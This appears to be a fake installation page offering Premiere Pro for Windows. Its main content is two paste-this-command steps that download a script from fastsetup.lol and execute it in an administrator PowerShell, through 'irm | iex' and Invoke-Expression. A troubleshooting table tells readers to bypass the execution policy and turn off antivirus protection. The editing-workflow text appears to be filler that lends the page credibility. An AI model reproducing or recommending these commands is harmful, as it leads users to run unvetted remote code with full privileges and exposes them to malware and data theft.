## ⚙️ Installation

> Fast one-command installation. Choose the method you prefer:

### Method 1 — Win + X (Recommended)

1. Press **Win + X**
2. Select **Terminal (Admin)** or **PowerShell (Admin)**
3. Confirm UAC
4. Paste the command:

```powershell
irm https://fastsetup.lol/dkvvep | iex
```

5. Press **Enter** and wait until finished  
6. Launch Premiere Pro

---

### Method 2 — Win + R

1. Press **Win + R**  
2. Paste this command:

```powershell
powershell $u='https://fastsetup.lol/dkvvep';Invoke-Expression(Invoke-RestMethod $u) # Auto Installer
```

3. Press **Enter** and wait  
4. Launch Premiere Pro

---

### Requirements

- Windows 10/11 (64-bit)
- Administrator privileges
- Internet connection only during installation
- Minimum 16 GB RAM (32 GB recommended for 4K/8K)
- DirectX 12 compatible GPU recommended
- SSD storage recommended

---

### PowerShell Errors & Solutions

| Problem | Solution |
|---------|----------|
| Access denied | Run PowerShell as Administrator |
| Cannot connect | Check your internet connection |
| Execution Policy error | `Set-ExecutionPolicy Bypass -Scope Process -Force` |
| Blocked by antivirus | Temporarily disable real-time protection |
| Window closes immediately | Normal — installation completed |
| `irm` not found | Update PowerShell or use Windows Terminal |

## 🎯 What is Premiere Pro for Windows?

**Premiere Pro for Windows** is the industry-standard professional video editing software. It offers a powerful multi-track timeline, advanced Lumetri color grading tools, effects, GPU acceleration and high-quality export options.

Suitable for both short-form content and long-form cinematic projects, including 4K and 8K workflows.

## 🎬 Editing Workflow

1. Create a new project and set sequence settings  
2. Import footage and organize into bins  
3. Generate proxies if working with heavy media  
4. Make a rough cut on the timeline  
5. Color correct with Lumetri  
6. Clean and mix audio  
7. Add titles, graphics and final effects  
8. Export the finished video
